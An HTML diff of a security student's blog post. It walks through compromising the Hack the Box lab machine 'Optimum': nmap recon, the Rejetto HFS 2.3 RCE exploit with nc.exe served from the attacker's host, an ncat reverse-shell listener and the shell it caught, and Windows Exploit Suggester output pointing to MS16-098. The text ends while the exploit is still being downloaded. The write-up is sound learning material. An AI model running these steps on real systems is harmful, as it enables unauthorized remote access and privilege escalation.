@@ -1,0 +1,416 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="LogistyxCat, Blog of a security student.">
+
+        <link rel="alternate"  href="https://logistyxcat.github.io/feeds/all.atom.xml" type="application/atom+xml" title="LogistyxCat Full Atom Feed"/>
+
+        <title>Optimum - Hack the Box // LogistyxCat // Blog of a security student.</title>
+
+
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.3.0/pure-min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="./theme/css/pure.css">
+    <link rel="stylesheet" href="./theme/css/pygments.css">
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/fitvids/1.0.1/jquery.fitvids.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $(".content").fitVids();
+        });
+    </script>
+</head>
+
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar sidebar-article pure-u">
+        <header class="header-article">
+            <hgroup>
+                <a href="./author/riley.html" title="See posts by Riley">
+                </a>
+                <h2 class="article-info">Riley</h2>
+                <small class="about-author"></small>
+                <h5>Published</h5>
+                <p>Sun 03 May 2020</p>
+                <a href="/">&larr;Home</a>
+            </hgroup>
+        </header>
+    </div>
+    <div class="pure-u">
+        <div class="content">
+            <section class="post">
+                <header class="post-header">
+                    <h1>Optimum - Hack the Box</h1>
+                        <p class="post-meta">
+                            // under                                 <a class="post-category" href="./tag/ctf.html">ctf</a>
+                                <a class="post-category" href="./tag/hack-the-box.html">hack the box</a>
+                                <a class="post-category" href="./tag/oscp-prep.html">oscp prep</a>
+                        </p>
+                </header>
+            </section>
+            <h2>Description</h2>
+<p>Optimum is a Windows 2012 R2 server with only an HTTP server available on it. After exploiting the web server, we move on to identifying a compatible kernel exploit to get to system.</p>
+<h2>Reconnaissance</h2>
+<p>Optimum is hosted on IP 10.10.10.8.</p>
+<h4>Nmap</h4>
+<div class="highlight"><pre><span></span>nmap -sV -sC -oA nmap/optimum <span class="m">10</span>.10.10.8                                                                           
+Starting Nmap <span class="m">7</span>.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at <span class="m">2020</span>-05-03 <span class="m">12</span>:18 PDT     
+Nmap scan report <span class="k">for</span> <span class="m">10</span>.10.10.8   
+Host is up <span class="o">(</span><span class="m">0</span>.12s latency<span class="o">)</span>.                                     
+Not shown: <span class="m">999</span> filtered ports                                                                                                                                
+PORT   STATE SERVICE VERSION                                                                                                                                 
+<span class="m">80</span>/tcp open  http    HttpFileServer httpd <span class="m">2</span>.3                                                                                                                
+<span class="p">|</span>_http-server-header: HFS <span class="m">2</span>.3      
+<span class="p">|</span>_http-title: HFS /   
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</pre></div>
+
+
+<p>The HTTP server hosts a Rejetto HttpFileServer v2.3.</p>
+<p><img alt="eea2296636a6b8d964096ab92419281b.png" src="images/ctf/htb/optimum/8b7396f97c9b48be9f0b2e77091f92b1.png"></p>
+<h2>Anonymous -&gt; User</h2>
+<p>This version has a known RCE exploit (<a href="https://www.exploit-db.com/exploits/39161">EDB 39161</a>. To set up the exploit, we need to: 1) host a Windows <code>nc.exe</code> binary on a web server that will be downloaded to our target; 2) configure the exloit file to connect back to a listener on our own box; 3) run the exploit, possibly multiple times. In order to set this up, I had to use 3 terminal windows; <code>tmux</code> makes this an easy task, and I highly suggest picking it up.</p>
+<p><strong># Terminal 1 / http server:</strong></p>
+<p>In this terminal, we locate the <code>nc.exe</code> file in Kali, create a soft link in our local directory, then start a simple HTTP server using Python.</p>
+<div class="highlight"><pre><span></span><span class="c1"># locate nc.exe</span>
+/usr/share/windows-resources/binaries/nc.exe
+<span class="c1"># link -s /usr/share/windows-resources/binaries/nc.exe ./nc.exe</span>
+<span class="c1"># python3 -m http.server 80</span>
+Serving HTTP on <span class="m">0</span>.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</pre></div>
+
+
+<p><strong># Terminal 2 / ncat:</strong></p>
+<p>We need to configure the file to send back to our own address and stand up a listener for the server to connect back to. To configure the file, replace the IP and port on lines 35 &amp; 36 respectively. For the latter task I use <code>ncat</code>, listening on port <code>8080</code>.</p>
+<div class="highlight"><pre><span></span><span class="c1"># ncat -nvl 8080</span>
+Ncat: Version <span class="m">7</span>.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::8080
+Ncat: Listening on <span class="m">0</span>.0.0.0:8080
+</pre></div>
+
+
+<h3>Exploiting the HFS:</h3>
+<p>Now we just need to run the exploit. I had to run this 2 times: the first time made a connection back to download <code>nc.exe</code> from the web server but did not spawn a shell; the second time did spawn a shell.  This is in-line with a note in the exploit file.</p>
+<p><strong># Terminal 3 / exploit:</strong></p>
+<div class="highlight"><pre><span></span><span class="c1"># python2 ./39161.py 10.10.10.8 80</span>
+<span class="c1"># python2 ./39161.py 10.10.10.8 80</span>
+</pre></div>
+
+
+<p><strong># Terminal 1 / http server, exec 1:</strong></p>
+<div class="highlight"><pre><span></span>Serving HTTP on <span class="m">0</span>.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+<span class="m">10</span>.10.10.8 - - <span class="o">[</span><span class="m">03</span>/May/2020 <span class="m">12</span>:40:02<span class="o">]</span> <span class="s2">&quot;GET /nc.exe HTTP/1.1&quot;</span> <span class="m">200</span> -
+<span class="m">10</span>.10.10.8 - - <span class="o">[</span><span class="m">03</span>/May/2020 <span class="m">12</span>:40:02<span class="o">]</span> <span class="s2">&quot;GET /nc.exe HTTP/1.1&quot;</span> <span class="m">200</span> -
+<span class="m">10</span>.10.10.8 - - <span class="o">[</span><span class="m">03</span>/May/2020 <span class="m">12</span>:40:02<span class="o">]</span> <span class="s2">&quot;GET /nc.exe HTTP/1.1&quot;</span> <span class="m">200</span> -
+<span class="m">10</span>.10.10.8 - - <span class="o">[</span><span class="m">03</span>/May/2020 <span class="m">12</span>:40:02<span class="o">]</span> <span class="s2">&quot;GET /nc.exe HTTP/1.1&quot;</span> <span class="m">200</span> -
+</pre></div>
+
+
+<p><strong># Terminal 2 / ncat, exec 2:</strong></p>
+<div class="highlight"><pre><span></span>Ncat: Listening on <span class="m">0</span>.0.0.0:8080
+Ncat: Connection from <span class="m">10</span>.10.10.8.
+Ncat: Connection from <span class="m">10</span>.10.10.8:49162.
+Microsoft Windows <span class="o">[</span>Version <span class="m">6</span>.3.9600<span class="o">]</span>
+<span class="o">(</span>c<span class="o">)</span> <span class="m">2013</span> Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;whoami <span class="o">&amp;&amp;</span> hostname
+whoami <span class="o">&amp;&amp;</span> hostname
+optimum<span class="se">\k</span>ostas
+optimum
+
+C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;dir  
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D0BC-0196
+
+ Directory of C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop
+
+<span class="m">10</span>/05/2020  <span class="m">07</span>:19     &lt;DIR&gt;          .
+<span class="m">10</span>/05/2020  <span class="m">07</span>:19     &lt;DIR&gt;          ..
+<span class="m">18</span>/03/2017  <span class="m">03</span>:11            <span class="m">760</span>.320 hfs.exe
+<span class="m">18</span>/03/2017  <span class="m">03</span>:13                 <span class="m">32</span> user.txt.txt
+               <span class="m">2</span> File<span class="o">(</span>s<span class="o">)</span>        <span class="m">760</span>.352 bytes
+               <span class="m">2</span> Dir<span class="o">(</span>s<span class="o">)</span>  <span class="m">31</span>.882.088.448 bytes free
+</pre></div>
+
+
+<h2>Server enumeration</h2>
+<p>From this point, we can perform further enumeration on the target system. A good place to start is with OS and system information.</p>
+<p><strong>&gt; systeminfo</strong></p>
+<div class="highlight"><pre><span></span><span class="err">Host Name:                 OPTIMUM            </span>
+<span class="err">OS Name:                   Microsoft Windows Server 2012 R2 Standard</span>
+<span class="err">OS Version:                6.3.9600 N/A Build 9600</span>
+<span class="err">OS Manufacturer:           Microsoft Corporation</span>
+<span class="err">OS Configuration:          Standalone Server</span>
+<span class="err">OS Build Type:             Multiprocessor Free</span>
+<span class="err">Registered Owner:          Windows User</span>
+<span class="err">Registered Organization:   </span>
+<span class="err">Product ID:                00252-70000-00000-AA535</span>
+<span class="err">Original Install Date:     18/3/2017, 1:51:36 </span>
+<span class="err">System Boot Time:          10/5/2020, 7:17:21 </span>
+<span class="err">System Manufacturer:       VMware, Inc.</span>
+<span class="err">System Model:              VMware Virtual Platform</span>
+<span class="err">System Type:               x64-based PC</span>
+<span class="err">Processor(s):              1 Processor(s) Installed.</span>
+<span class="err">                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz</span>
+<span class="err">BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018</span>
+<span class="err">Windows Directory:         C:\Windows</span>
+<span class="err">System Directory:          C:\Windows\system32</span>
+<span class="err">Boot Device:               \Device\HarddiskVolume1</span>
+<span class="err">System Locale:             el;Greek</span>
+<span class="err">Input Locale:              en-us;English (United States)</span>
+<span class="err">Time Zone:                 (UTC+02:00) Athens, Bucharest</span>
+<span class="err">Total Physical Memory:     4.095 MB</span>
+<span class="err">Available Physical Memory: 3.479 MB</span>
+<span class="err">Virtual Memory: Max Size:  5.503 MB</span>
+<span class="err">Virtual Memory: Available: 4.682 MB</span>
+<span class="err">Virtual Memory: In Use:    821 MB</span>
+<span class="err">Page File Location(s):     C:\pagefile.sys</span>
+<span class="c">Domain:                    HTB</span>
+<span class="err">Logon Server:              \\OPTIMUM</span>
+<span class="err">Hotfix(s):                 31 Hotfix(s) Installed.</span>
+<span class="err">                           [01]: KB2959936</span>
+<span class="err">                           [02]: KB2896496</span>
+<span class="err">                           [03]: KB2919355</span>
+<span class="err">                           [04]: KB2920189</span>
+<span class="err">                           [05]: KB2928120</span>
+<span class="err">                           [06]: KB2931358</span>
+<span class="err">                           [07]: KB2931366</span>
+<span class="err">                           [08]: KB2933826</span>
+<span class="err">                           [09]: KB2938772</span>
+<span class="err">                           [10]: KB2949621</span>
+<span class="err">                           [11]: KB2954879</span>
+<span class="err">                           [12]: KB2958262</span>
+<span class="err">                           [13]: KB2958263</span>
+<span class="err">                           [14]: KB2961072</span>
+<span class="err">                           [15]: KB2965500</span>
+<span class="err">                           [16]: KB2966407</span>
+<span class="err">                           [17]: KB2967917</span>
+<span class="err">                           [18]: KB2971203</span>
+<span class="err">                           [19]: KB2971850</span>
+<span class="err">                           [20]: KB2973351</span>
+<span class="err">                           [21]: KB2973448</span>
+<span class="err">                           [22]: KB2975061</span>
+<span class="err">                           [23]: KB2976627</span>
+<span class="err">                           [24]: KB2977629</span>
+<span class="err">                           [25]: KB2981580</span>
+<span class="err">                           [26]: KB2987107</span>
+<span class="err">                           [27]: KB2989647</span>
+<span class="err">                           [28]: KB2998527</span>
+<span class="err">                           [29]: KB3000850</span>
+<span class="err">                           [30]: KB3003057</span>
+<span class="err">                           [31]: KB3014442</span>
+<span class="err">Network Card(s):           1 NIC(s) Installed.</span>
+<span class="err">                           [01]: Intel(R) 82574L Gigabit Network Connection</span>
+<span class="err">                                 Connection Name: Ethernet0</span>
+<span class="err">                                 DHCP Enabled:    No</span>
+<span class="err">                                 IP address(es)</span>
+<span class="err">                                 [01]: 10.10.10.8</span>
+<span class="err">Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</span>
+</pre></div>
+
+
+<p>This is a Windows Server 2012 R2 box running on an old patch. A kernel exploit could work; we can investigate this using <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows Exploit Suggester</a>. I would suggest the use of Watson, but as this is an old box and Watson no longer supports versions of Windows below 10 or Server 2016, it may miss integral information.</p>
+<p>The first step in doing this was saving the above systeminfo output into a txt file.  Next, I updated Windows Exploit Suggester and ran the python script.</p>
+<p><strong>&gt; windows-exploit-suggester</strong></p>
+<div class="highlight"><pre><span></span><span class="c1"># ./windows-exploit-suggester.py -d ./2020-05-03-mssb.xls --systeminfo systeminfo.txt</span>
+<span class="o">[</span>*<span class="o">]</span> initiating winsploit version <span class="m">3</span>.3...
+<span class="o">[</span>*<span class="o">]</span> database file detected as xls or xlsx based on extension
+<span class="o">[</span>*<span class="o">]</span> attempting to <span class="nb">read</span> from the systeminfo input file
+<span class="o">[</span>+<span class="o">]</span> systeminfo input file <span class="nb">read</span> successfully <span class="o">(</span>ascii<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span> querying database file <span class="k">for</span> potential vulnerabilities
+<span class="o">[</span>*<span class="o">]</span> comparing the <span class="m">32</span> hotfix<span class="o">(</span>es<span class="o">)</span> against the <span class="m">266</span> potential bulletins<span class="o">(</span>s<span class="o">)</span> with a database of <span class="m">137</span> known exploits                   
+<span class="o">[</span>*<span class="o">]</span> there are now <span class="m">246</span> remaining vulns
+<span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>E<span class="o">]</span> exploitdb PoC, <span class="o">[</span>M<span class="o">]</span> Metasploit module, <span class="o">[</span>*<span class="o">]</span> missing bulletin
+<span class="o">[</span>+<span class="o">]</span> windows version identified as <span class="s1">&#39;Windows 2012 R2 64-bit&#39;</span>
+<span class="o">[</span>*<span class="o">]</span>
+<span class="o">[</span>E<span class="o">]</span> MS16-135: Security Update <span class="k">for</span> Windows Kernel-Mode Drivers <span class="o">(</span><span class="m">3199135</span><span class="o">)</span> - Important
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service <span class="o">(</span>MS16-135<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - <span class="s1">&#39;win32k.sys&#39;</span> <span class="s1">&#39;NtSetWindowLongPtr&#39;</span> Privilege Escalation <span class="o">(</span>MS16-135<span class="o">)</span> <span class="o">(</span><span class="m">2</span><span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span>   https://github.com/tinysec/public/tree/master/CVE-2016-7255
+<span class="o">[</span>*<span class="o">]</span>
+<span class="o">[</span>E<span class="o">]</span> MS16-098: Security Update <span class="k">for</span> Windows Kernel-Mode Drivers <span class="o">(</span><span class="m">3178466</span><span class="o">)</span> - Important                                              
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows <span class="m">8</span>.1 <span class="o">(</span>x64<span class="o">)</span> - RGNOBJ Integer Overflow <span class="o">(</span>MS16-098<span class="o">)</span>                
+<span class="o">[</span>*<span class="o">]</span>
+<span class="o">[</span>M<span class="o">]</span> MS16-075: Security Update <span class="k">for</span> Windows SMB Server <span class="o">(</span><span class="m">3164038</span><span class="o">)</span> - Important
+<span class="o">[</span>*<span class="o">]</span>   https://github.com/foxglovesec/RottenPotato
+<span class="o">[</span>*<span class="o">]</span>   https://github.com/Kevin-Robertson/Tater
+<span class="o">[</span>*<span class="o">]</span>   https://bugs.chromium.org/p/project-zero/issues/detail?id<span class="o">=</span><span class="m">222</span> -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
+<span class="o">[</span>*<span class="o">]</span>   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
+<span class="o">[</span>*<span class="o">]</span>
+<span class="o">[</span>E<span class="o">]</span> MS16-074: Security Update <span class="k">for</span> Microsoft Graphics Component <span class="o">(</span><span class="m">3164036</span><span class="o">)</span> - Important                          
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure <span class="o">(</span>MS16-074<span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption <span class="o">(</span>MS16-074<span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span>
+<span class="o">[</span>E<span class="o">]</span> MS16-063: Cumulative Security Update <span class="k">for</span> Internet Explorer <span class="o">(</span><span class="m">3163649</span><span class="o">)</span> - Critical
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer <span class="m">11</span> - Garbage Collector Attribute Type Confusion <span class="o">(</span>MS16-063<span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span>
+<span class="o">[</span>E<span class="o">]</span> MS16-032: Security Update <span class="k">for</span> Secondary Logon to Address Elevation of Privile <span class="o">(</span><span class="m">3143141</span><span class="o">)</span> - Important
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows <span class="m">8</span>.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation <span class="o">(</span>MS16-032<span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows <span class="m">7</span>-10 <span class="p">&amp;</span> Server <span class="m">2008</span>-2012 <span class="o">(</span>x32/x64<span class="o">)</span> - Local Privilege Escalation <span class="o">(</span>MS16-032<span class="o">)</span> <span class="o">(</span>PowerShell<span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows <span class="m">7</span>-10 <span class="p">&amp;</span> Server <span class="m">2008</span>-2012 <span class="o">(</span>x32/x64<span class="o">)</span> - Local Privilege Escalation <span class="o">(</span>MS16-032<span class="o">)</span> <span class="o">(</span>C#<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>M<span class="o">]</span> MS16-016: Security Update <span class="k">for</span> WebDAV to Address Elevation of Privilege <span class="o">(</span><span class="m">3136041</span><span class="o">)</span> - Important
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows <span class="m">7</span> - WebDAV Privilege Escalation Exploit <span class="o">(</span>MS16-016<span class="o">)</span> <span class="o">(</span><span class="m">2</span><span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows <span class="m">7</span> SP1 x86 - WebDAV Privilege Escalation <span class="o">(</span>MS16-016<span class="o">)</span> <span class="o">(</span><span class="m">1</span><span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>E<span class="o">]</span> MS16-014: Security Update <span class="k">for</span> Microsoft Windows to Address Remote Code Execution <span class="o">(</span><span class="m">3134228</span><span class="o">)</span> - Important
+<span class="o">[</span>*<span class="o">]</span>   Windows <span class="m">7</span> SP1 x86 - Privilege Escalation <span class="o">(</span>MS16-014<span class="o">)</span>, https://www.exploit-db.com/exploits/40039/, PoC
+<span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>E<span class="o">]</span> MS16-007: Security Update <span class="k">for</span> Microsoft Windows to Address Remote Code Execution <span class="o">(</span><span class="m">3124901</span><span class="o">)</span> - Important
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load<span class="o">()</span> - Heap Corruption Buffer Underflow <span class="o">(</span>MS16-007<span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll <span class="o">(</span>MS-16-007<span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>E<span class="o">]</span> MS15-132: Security Update <span class="k">for</span> Microsoft Windows to Address Remote Code Execution <span class="o">(</span><span class="m">3116162</span><span class="o">)</span> - Important
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll <span class="o">(</span>MS15-132<span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting <span class="o">(</span>MS15-134<span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>E<span class="o">]</span> MS15-112: Cumulative Security Update <span class="k">for</span> Internet Explorer <span class="o">(</span><span class="m">3104517</span><span class="o">)</span> - Critical
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer <span class="m">9</span>/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read <span class="o">(</span>MS15-112<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>E<span class="o">]</span> MS15-111: Security Update <span class="k">for</span> Windows Kernel to Address Elevation of Privilege <span class="o">(</span><span class="m">3096447</span><span class="o">)</span> - Important
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/38474/ -- Windows <span class="m">10</span> Sandboxed Mount Reparse Point Creation Mitigation Bypass <span class="o">(</span>MS15-111<span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>E<span class="o">]</span> MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege <span class="o">(</span><span class="m">3089657</span><span class="o">)</span> - Important
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
+<span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>E<span class="o">]</span> MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution <span class="o">(</span><span class="m">3089656</span><span class="o">)</span> - Critical
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/38198/ -- Windows <span class="m">10</span> Build <span class="m">10130</span> - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
+<span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>M<span class="o">]</span> MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution <span class="o">(</span><span class="m">3079904</span><span class="o">)</span> - Critical
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
+<span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>E<span class="o">]</span> MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass <span class="o">(</span><span class="m">3050514</span><span class="o">)</span> - Important
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC <span class="o">(</span>MS15-052<span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>M<span class="o">]</span> MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege <span class="o">(</span><span class="m">3057191</span><span class="o">)</span> - Important
+<span class="o">[</span>*<span class="o">]</span>   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
+<span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>E<span class="o">]</span> MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution <span class="o">(</span><span class="m">3036220</span><span class="o">)</span> - Critical
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows <span class="m">8</span>.1 - win32k Local Privilege Escalation <span class="o">(</span>MS15-010<span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation <span class="o">(</span>MS15-010<span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation <span class="o">(</span>MS15-010<span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>E<span class="o">]</span> MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege <span class="o">(</span><span class="m">3023266</span><span class="o">)</span> - Important
+<span class="o">[</span>*<span class="o">]</span>   http://www.exploit-db.com/exploits/35661/ -- Windows <span class="m">8</span>.1 <span class="o">(</span><span class="m">32</span>/64 bit<span class="o">)</span> - Privilege Escalation <span class="o">(</span>ahcache.sys/NtApphelpCacheControl<span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>E<span class="o">]</span> MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege <span class="o">(</span><span class="m">3011780</span><span class="o">)</span> - Critical
+<span class="o">[</span>*<span class="o">]</span>   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege <span class="o">(</span>MS14-068<span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>M<span class="o">]</span> MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution <span class="o">(</span><span class="m">3011443</span><span class="o">)</span> - Critical
+<span class="o">[</span>*<span class="o">]</span>   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA <span class="o">(</span>HTML Application<span class="o">)</span> - Remote Code Execution <span class="o">(</span>MS14-064<span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span>   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc <span class="o">(</span>MS14-064<span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span>   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer &lt;<span class="o">=</span> <span class="m">11</span> - OLE Automation Array Remote Code Execution <span class="o">(</span><span class="c1">#1), PoC</span>
+<span class="o">[</span>*<span class="o">]</span>   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer &lt; <span class="m">11</span> - OLE Automation Array Remote Code Execution <span class="o">(</span>MSF<span class="o">)</span>, MSF
+<span class="o">[</span>*<span class="o">]</span>   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
+<span class="o">[</span>*<span class="o">]</span>   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
+<span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>M<span class="o">]</span> MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution <span class="o">(</span><span class="m">3000869</span><span class="o">)</span> - Important
+<span class="o">[</span>*<span class="o">]</span>   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution <span class="s1">&#39;Sandworm&#39;</span> Exploit <span class="o">(</span>MS14-060<span class="o">)</span>, PoC
+<span class="o">[</span>*<span class="o">]</span>   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
+<span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>M<span class="o">]</span> MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution <span class="o">(</span><span class="m">3000061</span><span class="o">)</span> - Critical
+<span class="o">[</span>*<span class="o">]</span>   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
+<span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>E<span class="o">]</span> MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege <span class="o">(</span><span class="m">2880430</span><span class="o">)</span> - Important
+<span class="o">[</span>M<span class="o">]</span> MS13-090: Cumulative Security Update of ActiveX Kill Bits <span class="o">(</span><span class="m">2900986</span><span class="o">)</span> - Critical
+<span class="o">[</span>*<span class="o">]</span> <span class="k">done</span>
+</pre></div>
+
+
+<p>There's a whole lot here to digest with this output.</p>
+<h3># User -&gt; Administrator: Exploiting MS16-098</h3>
+<p>The MS16-098 exploit seems promising upon analysis and exploit db has a direct link to a pre-compiled executable. We can download that and attempt to exploit the box with it.</p>
+<p>We start by downloading this to the attacking machine, then starting the SMB server again (if you closed it).</p>
+<div class="highlight"><pre><span></span><span class="c1"># wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe</span>
